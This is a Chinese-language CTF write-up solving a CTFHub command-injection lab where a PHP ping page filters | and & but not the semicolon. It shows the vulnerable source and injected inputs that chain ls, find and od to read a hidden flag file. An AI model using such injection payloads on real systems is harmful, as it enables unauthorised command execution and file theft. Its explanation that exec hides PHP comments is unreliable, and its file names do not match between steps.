# 题目： CTFHub 命令注入 - 过滤运算符 Writeup

## 题目描述
打开题目页面，源码如下：
```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/[\|\&]/", $ip, $m)) { // 过滤了管道符和逻辑与
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```
*分析：*
正则过滤了 | 和 &，但没有过滤分号 ;。
使用 exec() 执行，可能会导致多行输出被吞。

## 解题思路
###  漏洞原理
分号 ; 未被过滤，可以直接注入命令。
但题目使用了假的 flag_xxx.php 文件，且真实文件在 /var/www/html/ 下。由于 exec 会吞掉注释内容（//），直接 cat 或 base64 均无回显。

## 攻击链
使用 ; 测试执行。
发现诱饵文件，使用 find 找到绝对路径：/var/www/html/flag_xxx.php。
使用 od -tx1 将文件内容转成十六进制数字（无特殊字符），骗过 exec 回显。
将十六进制转回文本，得到 flag。

## 解题步骤
1. 寻找真实文件
输入：
```text
127.0.0.1;ls
```
发现 flag_21153020420598.php（假文件）。
使用 find 搜索真实路径：
```text
127.0.0.1;find / -name "*flag*" 2>/dev/null
```
找到真实路径：/var/www/html/flag_211533020420598.php。

2. 绕过回显限制（十六进制盲注）
cat 和 base64 均无法回显，使用 od 将文本转为十六进制：
```text
127.0.0.1;od -An -tx1 /var/www/html/flag_211533020420598.php
```
返回结果：
```text
3c 3f 70 68 70 20 2f 2f 20 63 74 66 68 75 62 7b
36 64 39 30 31 64 39 34 33 32 62 34 66 39 37 35
33 39 39 30 31 39 32 65 7d 0a
```
解码获取 Flag
将十六进制转换成文本：
```php
<?php // ctfhub{6d901d9432b4f9753990192e} ?>
```
提交 flag，通关！

## 踩坑指南
1. 被假文件误导
原因： 出题人在当前目录放了假的 flag_xxx.php，内容为空。
解决： 使用 find / 搜索绝对路径。

2. exec 吞掉输出
原因： exec 会忽略 PHP 注释和部分特殊字符，cat 无法回显。
解决： 使用 od 命令将文件内容转成十六进制或八进制。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| `;` 运算符 | 顺序执行多条命令，未被正则过滤 |
| `od` 命令 | `od -An -tx1` 将文件转成十六进制输出 |
| 无回显盲注 | 利用数字/编码绕过回显限制，提取数据 |

### 防御建议
1. 过滤所有拼接符：包括 ;、|、&、%0a 等。
2. 使用白名单：限制输入只能是 IP 格式。
